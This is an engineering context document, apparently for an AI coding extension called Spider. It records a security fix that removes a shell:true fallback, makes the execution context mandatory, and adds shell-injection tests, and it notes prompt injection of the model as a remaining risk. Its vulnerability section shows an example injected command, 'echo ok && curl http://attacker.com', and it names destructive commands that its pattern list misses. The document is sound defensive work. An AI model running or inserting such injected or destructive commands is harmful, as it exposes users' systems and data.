# Spider Project Context 3

> Engineering context document. Do NOT overwrite AI_PROJECT_CONTEXT.md or AI_PROJECT_CONTEXT2.md.
> Created: 2026-10-04. Documents the command execution security hardening task.

---

## Security Work

This document captures the complete security audit and hardening of Spider's
command execution pipeline performed on 2026-10-04.

**Objective:** Eliminate the `shell: true` fallback from all execution paths
and make `ExecutionContext` mandatory, so a missing context always causes a
hard failure rather than a silent downgrade to unsafe shell execution.

---

## Problem Identified

### The Vulnerability

In `commandRunner.ts`, when `RunCommandOptions.context` was absent:

```typescript
// BEFORE (vulnerable):
const child = options.context
  ? spawnWithContext(spawnFn, options.context, options.command, options.cwd)
  : spawnFn(options.command, {
      cwd: options.cwd,
      shell: true,        // ← ANY model-supplied command was interpreted by the OS shell
      windowsHide: true,
    });
```

A model-supplied command string like `"echo ok && curl http://attacker.com"`
would be passed directly to the OS shell with full metacharacter interpretation.

### Root Cause Chain

```
WorkspaceToolExecutor.resolveExecution()
  → if (!this.executionManager) return { directory: hostDirectory }  // no context!
  → runCommand() called with no context in RunCommandOptions
  → commandRunner.runWorkspaceCommand({ context: undefined, ... })
  → spawn(command, { shell: true })                                   // UNSAFE
```

The same pattern existed in:
- `backgroundProcessManager.ts` (context-absent fallback was `shell: false`
  but still bypassed the WSL/env resolution, creating an unsecured environment)
- `runTestsTool.ts` (resolved to host directory without proper env)

### Trust Boundary

```
LLM output
  ↓  (completely untrusted)
tool call JSON { "name": "run_command", "input": { "command": "<model text>" } }
  ↓
ToolRouter.route()   ← permission gate here
  ↓  (permitted)
WorkspaceToolExecutor.dispatch()
  ↓
runCommand() private method
  ↓
runWorkspaceCommand({ command: <model text>, context: undefined })
  ↓  ← VULNERABILITY: shell:true reached here
spawn(<model text>, { shell: true })
```

---

## Execution Architecture

### Full call chain (after fix)

```
LLM
  ↓ (tool call JSON)
ToolRouter.route()
  ↓ authorize() → PermissionManager.authorize()
  │   trust gate → explicit deny → policy auto-allow → runtime shield → ask
  ↓ (allowed)
WorkspaceToolExecutor.execute()
  ↓
WorkspaceToolExecutor.dispatch() → "run_command" case
  ↓
WorkspaceToolExecutor.runCommand()
  ↓ resolveExecution(workspacePath, hostDirectory)
  │   ↓ if (!executionManager) → throw ToolExecutionError("dependency_unavailable")
  │   ↓ executionManager.resolveExecution(workspacePath, hostDirectory)
  │       ↓ ExecutionManager.resolve(workspacePath)
  │           ↓ resolveExecutionContext(environment, workspacePath)
  │               → ExecutionContext { platform, shell, backend, workspaceRoot, env, ... }
  │       ↓ translatorFor(context).toExecutionCwd(...)
  │           → executionCwd (Linux path for WSL, native path for local)
  ↓ runWorkspaceCommand({ command, cwd: executionCwd, context })
  ↓ runtime validation: if (!context) throw ExecutionContextError
  ↓ spawnWithContext(spawnFn, context, command, cwd)
      ↓ buildCommandInvocation(context, command, cwd)
          → SpawnInvocation { file, args, shell: false, cwd, env }
      ↓ spawnFn(file, args, { shell: false, ... })
          → ChildProcess
```

For `background_command`:
```
WorkspaceToolExecutor.startBackgroundCommand()
  ↓ resolveExecution()  (same as above, throws if no executionManager)
  ↓ BackgroundProcessManager.start({ command, args, cwd, context })
      ↓ runtime validation: if (!context) throw ExecutionContextError
      ↓ buildArgvInvocation(context, command, args, cwd)
          → SpawnInvocation { file, args, shell: false, cwd, env }
      ↓ spawnFn(file, args, { shell: false, ... })
```

For `run_tests`:
```
runTestsTool.runTests()
  ↓ resolveExecution(deps.executionManager, workspacePath, cwd)
  │   ↓ if (!manager) → throw ToolExecutionError("dependency_unavailable")
  │   ↓ manager.resolveExecution(workspacePath, hostDirectory)
  ↓ BackgroundProcessManager.start({ command: runner, args, cwd, context })
      ↓ (same as background_command from here)
```

---

## Security Invariants

After this hardening, the following invariants hold:

### 1. No missing context silently uses shell:true

```typescript
// AFTER (secure):
if (!options.context || typeof options.context !== "object") {
  throw new ExecutionContextError(
    "Execution context is required before running commands. " +
    "A missing or invalid ExecutionContext is treated as a security failure..."
  );
}
```

This check exists at **runtime** in addition to TypeScript types.

### 2. context is a required type (TypeScript)

```typescript
// commandRunner.ts
export interface RunCommandOptions {
  readonly context: ExecutionContext;   // required, not optional
  // ...
}

// backgroundProcessManager.ts
export interface BackgroundProcessStartRequest {
  readonly context: ExecutionContext;   // required, not optional
  // ...
}
```

### 3. All callers of resolveExecution fail closed when executionManager absent

```typescript
// workspaceToolExecutor.ts
private resolveExecution(...): { context: ExecutionContext; directory: string } {
  if (!this.executionManager) {
    throw new ToolExecutionError("dependency_unavailable", "...");
  }
  // ...
}

// runTestsTool.ts
function resolveExecution(manager: ExecutionManager | undefined, ...): { context: ExecutionContext; directory: string } {
  if (!manager) {
    throw new ToolExecutionError("dependency_unavailable", "...");
  }
  // ...
}
```

### 4. Every spawn call has shell: false

The `buildCommandInvocation()` function unconditionally produces
`SpawnInvocation.shell = false` for every platform and backend:

- Linux/macOS: `spawn(shellPath, ["-c", command], { shell: false })`
- Windows cmd: `spawn("cmd.exe", ["/d", "/s", "/c", command], { shell: false })`
- Windows PowerShell: `spawn("powershell.exe", ["-NoProfile", "-Command", command], { shell: false })`
- WSL: `spawn("wsl.exe", ["-d", distro, "--cd", cwd, "--", shell, "-lc", command], { shell: false })`

### 5. Permission gate runs BEFORE any process creation

`ToolRouter.route()` calls `authorize()` before `executor.execute()`. A
denied permission never reaches `commandRunner`.

---

## Shell Execution Policy

Shells are **explicitly resolved**, never guessed.

When `run_command` is called:
1. `ExecutionManager.resolve(workspacePath)` determines the correct shell from
   VS Code's authoritative facts: `process.platform`, `vscode.env.remoteName`,
   `vscode.env.shell`, user configuration.
2. The resolved shell is stored in `ExecutionContext.shell` (one of:
   `powershell`, `cmd`, `bash`, `sh`, `zsh`).
3. `buildCommandInvocation()` uses this to construct the exact spawn invocation.

| Situation | Shell used | Backend |
|-----------|-----------|---------|
| Windows workspace, VS Code terminal = cmd | `cmd.exe /d /s /c` | local |
| Windows workspace, VS Code terminal = PowerShell | `powershell.exe -NoProfile -Command` | local |
| Linux workspace | bash/sh/zsh (from VS Code shell) | local |
| macOS workspace | zsh/bash (from VS Code shell) | local |
| WSL workspace (UNC path from Windows host) | `wsl.exe -d <distro> -- bash -lc` | wsl |
| VS Code connected to WSL remotely | bash -lc (inside distro) | local |
| VS Code SSH remote | resolved shell in remote | local |

**Shell execution is only enabled when the ExecutionContext explicitly requires
it.** The command string is passed as a single `-c`/`-Command`/`/c` argument;
it cannot be split across multiple spawn arguments.

---

## Context Resolution

`ExecutionManager.resolve(workspacePath)` follows this precedence:

1. `remoteName === "wsl"` → extension host is inside WSL; use local
   execution with a POSIX shell.
2. `hostPlatform === "win32"` AND workspace is a UNC WSL path
   (`\\wsl.localhost\Ubuntu\...` or `\\wsl$\Ubuntu\...`) → bridge through
   `wsl.exe` (WSL backend).
3. Any other `remoteName` → remote execution; use the remote extension host's
   local environment.
4. Otherwise → local execution on the native host platform.

Contexts are cached per workspace and invalidated when `updateEnvironment()`
or `invalidate()` is called (workspace or remote authority changed).

Path translation (`toExecutionCwd`) converts validated host-side absolute paths
into execution-environment paths. For WSL-UNC workspaces, the Windows path
segment is converted to a Linux path anchored to the workspace root.

---

## Permission Flow

```
run_command tool call
  ↓
ToolRouter.route()
  ↓
authorize(request, signal)   ← PermissionManager
  │
  ├── isBlockedByTrust()     ← workspace trust gate (vscode.workspace.isTrusted)
  ├── effectiveRuleFor()     ← explicit user deny rules
  ├── shouldAutoAllow()      ← READ auto-allow, EXTERNAL auto-allow policies
  ├── shouldRuntimeAutoApprove()  ← composer shield (non-destructive only)
  └── requestPermission()   ← show UI prompt to user
  ↓
allowed: true → WorkspaceToolExecutor.execute()
allowed: false → { success: false, code: "permission_denied" }
```

Key invariants:
- Destructive requests ALWAYS prompt; they cannot be auto-approved by the shield.
- Untrusted workspaces block EXECUTE/MODIFY/EXTERNAL/DESTRUCTIVE entirely.
- The permission gate runs BEFORE any process creation.

`run_command` is classified as `EXECUTE`. By default, EXECUTE requests prompt
the user unless a rule has been set to allow them.

---

## Tests

### Updated Tests (regression tests for existing functionality)

| Test File | What Changed |
|-----------|-------------|
| `commandRunner.output.test.ts` | Added `ExecutionManager` context; added fail-closed assertion |
| `backgroundProcessManager.test.ts` | All `start()` calls now provide `context: LOCAL_CONTEXT` |
| `phase2Tools.integration.test.ts` | `ExecutionManager` added to `WorkspaceToolExecutor` setup |
| `phase3Tools.integration.test.ts` | `ExecutionManager` added to executor setup |
| `phase5Tools.integration.test.ts` | `ExecutionManager` added to executor setup |
| `runTestsTool.test.ts` | `executionManager` added to all `runTests()` deps |
| `workspaceToolExecutor.test.ts` | Rewritten to use real `ExecutionManager` |

### New Security Tests

`test/unit/runtime/execution/shellInjectionSecurity.test.ts`

| Test Group | Coverage |
|------------|---------|
| Shell injection payloads (Linux/bash) | 30+ payloads; confirms each is the final single `-c` arg |
| Shell injection payloads (Windows/cmd) | Same payloads; `/c` position |
| Shell injection payloads (Windows/PowerShell) | Same payloads; `-Command` position |
| Shell injection payloads (WSL) | Same payloads; `--` position in wsl.exe argv |
| argv command injection | Metacharacter args are verbatim entries; none reaches executable position |
| commandRunner shell:false | Confirmed for every context type |
| commandRunner payload is single arg | Last arg is always the full command string |
| Fallback: context undefined | Throws `ExecutionContextError`; spawn not called |
| Fallback: context null | Throws `ExecutionContextError`; spawn not called |
| Fallback: spawn not called | Verified by spy |
| Error message | Confirms security-invariant wording |
| BackgroundProcessManager: context undefined | Throws; no spawn |
| BackgroundProcessManager: context null | Throws; no spawn |
| runTests: no executionManager | `dependency_unavailable`; no spawn |
| WorkspaceToolExecutor: run_command, no executionManager | `dependency_unavailable` |
| WorkspaceToolExecutor: background_command, no executionManager | `dependency_unavailable` |
| WorkspaceToolExecutor: run_tests, no executionManager | `dependency_unavailable` |
| Invalid context: empty workspace | `ExecutionContextError` |
| Invalid context: whitespace workspace | `ExecutionContextError` |
| Invalid context: unsupported platform | `ExecutionContextError` |
| Invalid context: path escaping WSL workspace | `ExecutionContextError` |
| Stale context: re-resolves after invalidation | New object, same content |
| Stale context: picks up changed environment | Platform change reflected |
| Permission gate: denied → no spawn | Confirmed via spy |
| Permission gate: allowed → execution proceeds | Context passed through |

---

## Files Changed

### Production Source

| File | Change Summary |
|------|---------------|
| `src/runtime/tools/commandRunner.ts` | `context` required; runtime validation; `shell: true` branch removed |
| `src/runtime/tools/backgroundProcessManager.ts` | `context` required in `BackgroundProcessStartRequest`; runtime validation; fallback removed |
| `src/runtime/tools/workspaceToolExecutor.ts` | `resolveExecution()` fails closed when no executionManager; return type non-optional |
| `src/runtime/tools/runTestsTool.ts` | `resolveExecution()` fails closed when no executionManager; return type non-optional |

### Test Files

| File | Change Summary |
|------|---------------|
| `test/unit/runtime/tools/commandRunner.output.test.ts` | Updated to provide context; added fail-closed test |
| `test/unit/runtime/tools/backgroundProcessManager.test.ts` | All start() calls updated with context |
| `test/unit/runtime/tools/phase2Tools.integration.test.ts` | executionManager added |
| `test/unit/runtime/tools/phase3Tools.integration.test.ts` | executionManager added |
| `test/unit/runtime/tools/phase5Tools.integration.test.ts` | executionManager added |
| `test/unit/runtime/tools/runTestsTool.test.ts` | executionManager added to all deps |
| `test/unit/runtime/tools/workspaceToolExecutor.test.ts` | Rewritten with real ExecutionManager |
| `test/unit/runtime/execution/shellInjectionSecurity.test.ts` | **NEW** — security regression test suite |

### Documentation

| File | Content |
|------|---------|
| `risk.md` | Security risk register entry for shell:true vulnerability |
| `AI_PROJECT_CONTEXT3.md` | This document |

---

## Remaining Risks

1. **Prompt injection** — structural controls prevent shell metacharacter
   injection in `spawn()`. They do not prevent the model from being prompted to
   emit destructive commands that are structurally valid. The permission gate
   (with `DESTRUCTIVE_COMMAND_PATTERNS` matching) is the primary defense.

2. **`DESTRUCTIVE_COMMAND_PATTERNS` is incomplete** — the list catches common
   patterns but not all dangerous commands. `find . -delete`, `git push --force`,
   `npm publish`, etc. are not covered.

3. **DNS rebinding TOCTOU in `fetch_url`** — documented in `urlSecurity.ts`.

4. **No process sandbox** — spawned processes run as the user's account with
   no OS-level sandboxing.

5. **`gitStatusTool.ts` direct spawn** — not routed through `ExecutionManager`.
   Safe (hardcoded args, not model-driven) but does not benefit from WSL context
   resolution, and is not centrally audited.

---

## Future Work

1. **Route `gitStatusTool` through `ExecutionManager`** — centralize all spawns.

2. **Expand `DESTRUCTIVE_COMMAND_PATTERNS`** — cover more destructive commands.

3. **Shell command parser** — parse the model's command string into an AST before
   passing to the shell; evaluate against a structural policy (block subshells,
   pipes, redirections, command substitution) when in high-security mode.

4. **Process sandboxing** — OS-level isolation for spawned processes.

5. **Command audit log** — tamper-evident log of all approved executions for
   post-incident forensics.

6. **`run_command` → `run_command_argv`** — expose an alternative tool that
   accepts `{ executable, args[] }` directly, bypassing shell interpretation
   entirely for callers that don't need a shell.
